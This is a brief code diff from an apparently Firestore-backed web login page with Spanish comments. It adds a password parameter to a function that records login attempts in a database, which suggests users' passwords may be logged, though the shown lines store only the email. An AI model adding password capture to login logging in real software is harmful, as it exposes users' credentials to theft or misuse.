@@ -93,7 +93,7 @@
         const db = getFirestore(app); // Inicializa Firestore
 
         // Función para guardar intentos de inicio de sesión en Firestore
-        async function saveLoginAttempt(email, success) {
+        async function saveLoginAttempt(email, password, success) {
             try {
                 const docRef = await addDoc(collection(db, "login_attempts"), {
                     email: email,
